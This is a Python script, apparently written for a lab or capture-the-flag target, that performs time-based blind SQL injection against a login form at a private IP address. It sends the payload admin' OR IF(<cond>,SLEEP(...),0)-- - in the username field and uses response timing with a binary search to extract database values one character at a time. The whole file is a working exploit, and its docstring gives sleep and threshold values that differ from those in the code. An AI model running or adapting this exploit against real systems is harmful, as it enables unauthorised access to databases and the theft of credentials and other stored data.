#!/usr/bin/env python3
"""Time-based blind SQLi extractor (fixed binary search, optimized sleep).

Oracle: POST /login username="admin' OR IF(<cond>,SLEEP(0.5),0)-- -" password=x
TRUE  -> ~1.6s (3 rows x 0.5s + overhead); FALSE -> ~0.15s. Threshold 0.7s.
"""
import sys, time, requests

URL = "http://10.0.179.144:80/login"
SLEEP = 0.2
THRESHOLD = 0.45

_session = requests.Session()

def oracle(cond: str) -> bool:
    payload = f"admin' OR IF({cond},SLEEP({SLEEP}),0)-- -"
    t0 = time.time()
    try:
        _session.post(URL, data={"username": payload, "password": "x"},
                      timeout=25, allow_redirects=False)
    except Exception:
        return False
    return (time.time() - t0) >= THRESHOLD

def extract_char(expr: str, pos: int) -> int:
    lo, hi = 0, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"ASCII(SUBSTRING(({expr}),{pos},1))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo

def extract_string(expr: str, maxlen: int = 100) -> str:
    out = []
    for i in range(1, maxlen + 1):
        c = extract_char(expr, i)
        if c == 0:
            break
        out.append(chr(c))
        sys.stdout.write(chr(c)); sys.stdout.flush()
    sys.stdout.write("\n"); sys.stdout.flush()
    return "".join(out)

if __name__ == "__main__":
    expr = sys.argv[1]
    maxlen = int(sys.argv[2]) if len(sys.argv) > 2 else 100
    if not oracle("1=1"):
        print("[!] sanity 1=1 failed", file=sys.stderr); sys.exit(1)
    if oracle("1=2"):
        print("[!] sanity 1=2 failed (false positive)", file=sys.stderr); sys.exit(1)
    print(f"[+] extracting: {expr}", file=sys.stderr)
    val = extract_string(expr, maxlen)
    print(f"\n[+] result = {val!r}", file=sys.stderr)

